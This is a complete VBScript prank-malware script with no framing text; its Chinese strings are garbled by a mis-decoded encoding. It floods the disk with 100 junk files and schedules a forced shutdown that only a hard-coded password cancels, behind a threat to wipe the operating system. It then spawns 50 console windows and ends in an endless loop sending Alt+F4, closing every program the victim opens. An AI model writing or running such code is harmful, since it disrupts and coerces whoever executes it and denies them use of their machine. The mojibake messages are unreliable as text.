Do Until t_i=1
t_i=t_i+1
T=T+"���已��ţ�� "
Loop
Do
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.OpenTextFile(I&".���已��ţ��", 2, True, -2)
f.Write T
f.Close
I=I+1
If I = 100 then
Exit Do
End If
Loop
Dim wshshell
MsgBox "�ҵĵ�����ô�ˣ�"
MsgBox "��ĵ��Ա����已ͬѧ����ȫԭ��������빥����"
MsgBox "����ȵİ취��"
MsgBox "û��(=^ ^=)"
Set wshshell = CreateObject("wscript.shell")
wshshell.Run "cmd.exe /c shutdown -s -t 120",0,True
MsgBox "��������"
Dim a
Do Until a = "5254754wlf"
a = InputBox ("�������������ػ���������󳬹�ʮ��ΰ��ȫ�ܵ����已�ͻ�ݻ���Ĳ���ϵͳ ")

Loop
MsgBox "������ȷ"
MsgBox "����ػ�"
WScript.Sleep 1000
wshshell.Run"cmd.exe /c shutdown -a",0,True
MsgBox "��ʵ�һٲ������ϵͳ"
MsgBox "���Һ�������"
Set shell=CreateObject("wscript.Shell")
a=1
Do
shell.Run "cmd /k MODE con: COLS=14 LINES=5&@echo off & color "&a&"7 &echo "&a&" "
If a=50 Then Exit do
a=a+1
Loop
MsgBox "���ǳͷ�����򿪵�һ�ж��ᱻ���已�ر�"
dim WSHshell 
 
set WSHshell = wscript.createobject("wscript.shell") 
 
while(1) 
 
WSHshell.SendKeys "%{F4}" 
 
Loop 